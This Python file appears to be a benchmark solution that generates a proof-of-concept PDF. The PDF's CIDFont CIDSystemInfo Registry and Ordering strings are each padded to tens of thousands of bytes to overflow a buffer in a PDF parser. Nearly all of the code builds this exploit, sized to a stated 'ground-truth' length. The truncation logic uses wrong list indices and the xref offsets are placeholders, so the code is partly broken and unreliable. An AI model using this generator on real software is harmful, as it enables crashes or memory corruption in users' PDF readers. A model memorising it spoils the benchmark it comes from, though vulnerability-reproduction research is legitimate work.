import os
import tarfile
import tempfile
from pathlib import Path
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source to analyze for vulnerability details
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Search for CIDFont-related files to understand structure
            root_dir = Path(tmpdir)
            cidfont_files = []
            for ext in ['.c', '.cpp', '.h', '.hpp']:
                cidfont_files.extend(root_dir.rglob(f'*{ext}'))
            
            # Look for patterns related to CIDSystemInfo and fallback
            vuln_patterns = [
                r'CIDSystemInfo',
                r'Registry.*Ordering',
                r'fallback',
                r'strcat.*strcpy.*memcpy',
                r'sprintf.*snprintf',
                r'buffer.*size.*length'
            ]
            
            # Analyze to understand buffer size constraints
            buffer_sizes = []
            for file in cidfont_files:
                try:
                    content = file.read_text(errors='ignore')
                    # Look for buffer declarations or size constraints
                    size_matches = re.findall(r'(?:sizeof|size.*?=\s*)(\d+)', content)
                    buffer_sizes.extend([int(s) for s in size_matches if int(s) < 100000])
                    
                    # Look for vulnerable patterns
                    for pattern in vuln_patterns:
                        if re.search(pattern, content, re.IGNORECASE):
                            # Try to extract more context
                            lines = content.split('\n')
                            for i, line in enumerate(lines):
                                if re.search(pattern, line, re.IGNORECASE):
                                    # Check nearby lines for buffer operations
                                    for j in range(max(0, i-3), min(len(lines), i+4)):
                                        if any(op in lines[j] for op in ['strcpy', 'strcat', 'memcpy', 'sprintf']):
                                            # Extract potential buffer sizes
                                            nums = re.findall(r'\b(\d+)\b', lines[j])
                                            buffer_sizes.extend([int(n) for n in nums if 100 < int(n) < 100000])
                except:
                    continue
            
            # Use ground-truth length as primary guide, but try to optimize
            target_length = 80064
            
            # If we found relevant buffer sizes, try to create minimal PoC
            if buffer_sizes:
                # Sort and find common sizes
                buffer_sizes.sort()
                # Look for sizes close to target length
                close_sizes = [s for s in buffer_sizes if abs(s - target_length) < 1000]
                if close_sizes:
                    # Use the smallest close size
                    target_length = min(close_sizes) + 100  # Add some overflow margin
            
            # Generate PDF structure with malicious CIDFont
            # Based on analysis of typical CIDFont vulnerabilities
            poc_parts = []
            
            # PDF header
            poc_parts.append(b'%PDF-1.4\n')
            poc_parts.append(b'1 0 obj\n')
            poc_parts.append(b'<<\n')
            poc_parts.append(b'  /Type /Font\n')
            poc_parts.append(b'  /Subtype /CIDFontType0\n')
            poc_parts.append(b'  /BaseFont /MaliciousFont\n')
            
            # Malicious CIDSystemInfo with long Registry-Ordering
            poc_parts.append(b'  /CIDSystemInfo <<\n')
            
            # Calculate lengths to achieve target PoC size
            # Header + object overhead is about 200 bytes
            # We need Registry and Ordering strings that when combined
            # with hyphen cause overflow
            overhead = 200
            string_len = target_length - overhead
            
            # Split between Registry and Ordering
            reg_len = string_len // 2
            ord_len = string_len - reg_len - 1  # -1 for hyphen
            
            # Create long strings
            registry = b'A' * reg_len
            ordering = b'B' * ord_len
            
            poc_parts.append(b'    /Registry (' + registry + b')\n')
            poc_parts.append(b'    /Ordering (' + ordering + b')\n')
            poc_parts.append(b'    /Supplement 0\n')
            poc_parts.append(b'  >>\n')
            poc_parts.append(b'>>\n')
            poc_parts.append(b'endobj\n')
            
            # PDF trailer
            poc_parts.append(b'xref\n')
            poc_parts.append(b'0 2\n')
            poc_parts.append(b'0000000000 65535 f \n')
            poc_parts.append(b'0000000010 00000 n \n')
            poc_parts.append(b'trailer\n')
            poc_parts.append(b'<<\n')
            poc_parts.append(b'  /Size 2\n')
            poc_parts.append(b'  /Root 1 0 R\n')
            poc_parts.append(b'>>\n')
            poc_parts.append(b'startxref\n')
            poc_parts.append(b'1000\n')  # Approximate offset
            poc_parts.append(b'%%EOF\n')
            
            poc = b''.join(poc_parts)
            
            # Ensure exact target length
            if len(poc) < target_length:
                # Pad with comments
                padding = b'\n% ' + b'X' * (target_length - len(poc) - 3) + b'\n'
                poc = poc.replace(b'%%EOF\n', padding + b'%%EOF\n')
            elif len(poc) > target_length:
                # Truncate from the middle of one string
                excess = len(poc) - target_length
                if excess < reg_len:
                    registry = registry[:-excess]
                    poc = b''.join(poc_parts[:4] + 
                                  [b'    /Registry (' + registry + b')\n'] + 
                                  poc_parts[5:])
            
            return poc
        
        # Fallback if analysis fails
        return b'A' * 80064